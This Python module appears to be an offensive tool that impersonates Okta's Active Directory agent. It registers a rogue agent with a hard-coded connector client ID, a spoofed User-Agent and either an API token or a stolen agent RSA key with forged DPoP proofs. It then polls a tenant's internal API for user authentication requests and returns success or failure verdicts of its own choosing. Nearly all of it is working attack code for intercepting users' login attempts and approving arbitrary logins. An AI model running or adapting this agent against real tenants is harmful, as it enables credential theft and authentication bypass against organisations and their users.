import requests
import re
import uuid
import time
import jwt
import json
from hashlib import sha256
from base64 import b64decode, urlsafe_b64encode
from Crypto.PublicKey import RSA

USER_AGENT = "Okta AD Agent/3.18.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)"
OKTA_CONNECTOR_CLIENT_ID = "cappT0Hfy97F1BoO1UTR"
OKTA_API_OAUTH_TOKEN = "/oauth2/token"
OKTA_API_OAUTH_V1_TOKEN = "/oauth2/v1/token"
OKTA_API_CREATE_TOKEN = "/api/v1/tokens"
OKTA_API_CREATE_DOMAIN = "/api/1/internal/app/activedirectory/"
OKTA_API_INIT_AGENT = "/api/1/internal/app/activedirectory/[DOMAIN_ID]/agent?name=[HOSTNAME]"
OKTA_API_CHECKIN_AGENT = "/api/1/internal/app/activedirectory/[DOMAIN_ID]/agent/[AGENT_ID]/actionResult?agentVersion=3.18.0.0"
OKTA_API_ACTION = "/api/1/internal/app/activedirectory/[DOMAIN_ID]/agent/[AGENT_ID]/nextAction?agentVersion=3.18.0.0&pollid=[POLL_ID]"
OKTA_API_ACTION_RESULT = "/api/1/internal/app/activedirectory/[DOMAIN_ID]/agent/[AGENT_ID]/actionResult?responseId=[RESPONSE_ID]"

class OktaADAgent:
  def __init__(self, tenant: str, domain="", agent_id="", app_id="", client_id="", device_name="", code="", api_key="", agent_key=""):
    self._tenant = tenant
    self._api_key = api_key
    self._agent_key = json.loads(agent_key) if agent_key else ""
    self._domain = domain
    self._device_name = device_name
    self._code = code
    self._agent_id = agent_id
    self._app_id = app_id
    self._client_id = client_id
    if api_key:
      self._authorization_header = f"SSWS {api_key}"
    elif agent_key:
      print("[*] Generating JSON Web Key for Agent Key Method")
      self._jwk_rsa_key = RSA.generate(4096)
      self._jwk_kid = uuid.uuid4().hex
      self._authorization_header = f"DPoP {self._get_access_token()}"
    else:
      self._authorization_header = ""

  def _generate_dpop_header(self, htm, htu, nonce="", ath=""):
    nbf = int(time.time())
    payload = {
      "htm": htm,
      "htu": htu,
      "nbf": nbf,
      "exp": nbf + 3600,
      "iat": nbf
    }
    if nonce:
      payload["nonce"] = nonce
    if ath:
      payload["ath"] = ath
    if ath or nonce:
      payload["jti"] = uuid.uuid4().hex

    int_to_b64 = lambda n: urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8)).decode().strip("=")

    return jwt.encode(
      payload,
      self._jwk_rsa_key.export_key(),
      algorithm="RS256",
      headers={
        "typ": "dpop+jwt",
        "jwk": {
          "alg": "RS256",
          "e": int_to_b64(self._jwk_rsa_key.e),
          "kid": self._jwk_kid,
          "kty": "RSA",
          "n": int_to_b64(self._jwk_rsa_key.n),
          "use": "sig"
        }
      }
    )

  def _get_access_token(self):
    headers = {
      "User-Agent": USER_AGENT,
      "DPoP": self._generate_dpop_header("POST", f"https://{self._tenant}{OKTA_API_OAUTH_V1_TOKEN}")
    }

    nbf = int(time.time())
    payload = {
      "sub": self._client_id,
      "jti": uuid.uuid4().hex,
      "nbf": nbf,
      "exp": nbf + 1800,
      "iat": nbf,
      "iss": "urn:okta:agents:ad-agent",
      "aud": f"https://{self._tenant}"
    }

    int_agent_key = {param: int.from_bytes(b64decode(value)) for param, value in self._agent_key.items()}
    rsa_agent_key = RSA.construct((
      int_agent_key["n"],
      int_agent_key["e"],
      int_agent_key["d"],
      int_agent_key["p"],
      int_agent_key["q"]
    ))

    agent_public_key_hash = sha256(b64decode(self._agent_key["e"]) + b64decode(self._agent_key["n"])).digest()
    kid = urlsafe_b64encode(agent_public_key_hash).decode().strip("=")
    
    assertion = jwt.encode(
      payload,
      rsa_agent_key.export_key(),
      algorithm="RS256",
      headers={
        "kid": kid,
        "typ": "JWT"
      }
    )

    data = {
      "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
      "scope": "okta.internal.adAgent.manage okta.internal.adAgent.read",
      "assertion": assertion
    }

    response = requests.post(f"https://{self._tenant}{OKTA_API_OAUTH_V1_TOKEN}", headers=headers, data=data)
    if response.json().get("error", "") != "use_dpop_nonce":
      raise RuntimeError("Nonce not required by the authorization server in the DPoP proof")

    headers["DPoP"] = self._generate_dpop_header(
      "POST",
      f"https://{self._tenant}{OKTA_API_OAUTH_V1_TOKEN}",
      nonce=response.headers["Dpop-Nonce"]
    )
    response = requests.post(f"https://{self._tenant}{OKTA_API_OAUTH_V1_TOKEN}", headers=headers, data=data)
    if "access_token" not in response.json():
      raise RuntimeError("Missing access token in the authorization server response")

    return response.json()["access_token"]
  
  def _check_authorization_header_expiry(self):
    if not self._authorization_header.startswith("DPoP"):
      return

    access_token = self._authorization_header.split()[1]
    exp = jwt.decode(access_token, options={"verify_signature": False})["exp"]
    if int(time.time()) + 60 > exp:
      self._authorization_header = f"DPoP {self._get_access_token()}"
      print("[*] Access token refreshed")

  def _create_ad_connector_token(self):
    '''
    Creates a new AD Connector Token using the OAuth flow
    '''

    headers = {
      "User-Agent": USER_AGENT
    }

    data = {
      "grant_type":"api_token", 
      "code":self._code,
      "client_id":OKTA_CONNECTOR_CLIENT_ID
    }

    response = requests.post(f"https://{self._tenant}{OKTA_API_OAUTH_TOKEN}", headers=headers, data=data)
    jsonResponse = response.json()

    if "api_token" in jsonResponse:
      self._authorization_header = f"SSWS {jsonResponse['api_token']}"

    return jsonResponse["api_token"]

  def _create_ad_domain(self):
    '''
    Creates a new AD Domain via the Okta Internal API
    If AD Domain already exists, the domain ID is retrieved
    '''

    data = f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><domain name="{self._domain}" />'
    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": self._authorization_header
    }
    
    response = requests.post(f"https://{self._tenant}{OKTA_API_CREATE_DOMAIN}", headers=headers, data=data)
    text = response.text
    matches = re.search('id="([^"]+)', text, re.IGNORECASE + re.MULTILINE) 
    if matches:
      self._app_id = matches.group(1)

    return self._app_id
  
  def _init_ad_agent(self):
    '''
    Initialises the AD Agent Name with Okta
    '''

    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": self._authorization_header
    }

    url = OKTA_API_INIT_AGENT.replace("[DOMAIN_ID]", self._app_id).replace("[HOSTNAME]", self._device_name)

    response = requests.post(f"https://{self._tenant}{url}", headers=headers)
    text = response.text

    matches = re.search('id="([^"]+)', text, re.IGNORECASE + re.MULTILINE) 
    if matches:
      self._agent_id = matches.group(1)

    return self._agent_id

  def _checkin_ad_agent(self):
    '''
    Checks in the AD Agent, essentially marking it as ready to receive requests
    '''

    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": self._authorization_header
    }

    data = f"""<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <type>INIT</type>
  <status>SUCCESS</status>
  <timestamps>
    <actionRecieivedFromOkta />
    <actionSentToLdapServer />
    <responseReceivedFromLdapServer />
    <responseSentToOkta>{int(time.time())}</responseSentToOkta>
    <actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
    <actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
    <responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
    <responseSentToOktaMilliseconds>20221210221429.278Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{{}}</additionalInfo>
</agentActionResult>"""

    url = OKTA_API_CHECKIN_AGENT.replace("[DOMAIN_ID]", self._app_id).replace("[AGENT_ID]", self._agent_id)
    response = requests.post(f"https://{self._tenant}{url}", headers=headers, data=data)
    return response.text

  def start_action_listening(self):
    url = OKTA_API_ACTION.replace("[DOMAIN_ID]", self._app_id).replace("[AGENT_ID]", self._agent_id).replace("[POLL_ID]", str(uuid.uuid4()))
    
    self._check_authorization_header_expiry()
    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": self._authorization_header
    }

    if self._authorization_header.startswith("DPoP"):
      access_token_hash = sha256(self._authorization_header.split()[1].encode()).digest()
      headers["DPoP"] = self._generate_dpop_header(
        "GET",
        f"https://{self._tenant}{url.split('?')[0]}",
        ath=urlsafe_b64encode(access_token_hash).decode().strip("=")
      )

    response = requests.get(f"https://{self._tenant}{url}", headers=headers)
    return response.text

  def send_action_result(self, action_id: str, success=False):
    if success:
      status = "SUCCESS"
      message = ""
      error_code = ""
    else:
      status = "FAILURE"
      message = "Login Failed"
      error_code = "1326"

    r = re.search(":([^:]+):$", action_id, re.IGNORECASE + re.MULTILINE)
    if r:
      response_id = r.group(1)

    else:
      response_id = ""

    data = f"""<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="{action_id}">
  <type>USER_AUTH</type>
  <status>{status}</status>
  <message>{message}</message>
  <errorCode>{error_code}</errorCode>
  <timestamps>
    <actionRecieivedFromOkta>{int(time.time())}</actionRecieivedFromOkta>
    <actionSentToLdapServer>{int(time.time())}</actionSentToLdapServer>
    <responseReceivedFromLdapServer>{int(time.time())}</responseReceivedFromLdapServer>
    <responseSentToOkta>{int(time.time())}</responseSentToOkta>
    <actionReceivedFromOktaMilliseconds>20221211205617.898Z</actionReceivedFromOktaMilliseconds>
    <actionSentToLdapServerMilliseconds>20221211205617.898Z</actionSentToLdapServerMilliseconds>
    <responseReceivedFromLdapServerMilliseconds>20221211205617.898Z</responseReceivedFromLdapServerMilliseconds>
    <responseSentToOktaMilliseconds>20221211205617.914Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>"""

    url = OKTA_API_ACTION_RESULT.replace("[DOMAIN_ID]", self._app_id).replace("[AGENT_ID]", self._agent_id).replace("[RESPONSE_ID]", response_id)
    
    self._check_authorization_header_expiry()
    headers = {
      "User-Agent": USER_AGENT,
      "Content-Type":"application/xml; charset=utf-8",
      "Authorization": self._authorization_header
    }

    if self._authorization_header.startswith("DPoP"):
      access_token_hash = sha256(self._authorization_header.split()[1].encode()).digest()
      headers["DPoP"] = self._generate_dpop_header(
        "POST",
        f"https://{self._tenant}{url.split('?')[0]}",
        ath=urlsafe_b64encode(access_token_hash).decode().strip("=")
      )

    response = requests.post(f"https://{self._tenant}{url}", headers=headers, data=data)
    return response.text

  def __enter__(self):

    # Create our AD connector
    if self._api_key:
      print("[*] Using Agent Token Method")
      return self
    elif self._agent_key:
      print("[*] Using Agent Key Method")
      return self
    
    print("[*] Creating Agent Token")
    token = self._create_ad_connector_token()
    print(f"[*] Token Created: {token}")
    
    print("[*] Getting Domain ID")
    domain_id = self._create_ad_domain()
    print(f"[*] Domain ID is {domain_id}")

    print("[*] Initialising AD Agent")
    agent_id = self._init_ad_agent()
    print(f"[*] Agent ID is {agent_id}")

    print("[*] Sending Agent Checkin")
    self._checkin_ad_agent()

    return self

  def __exit__(self, *args):
    pass

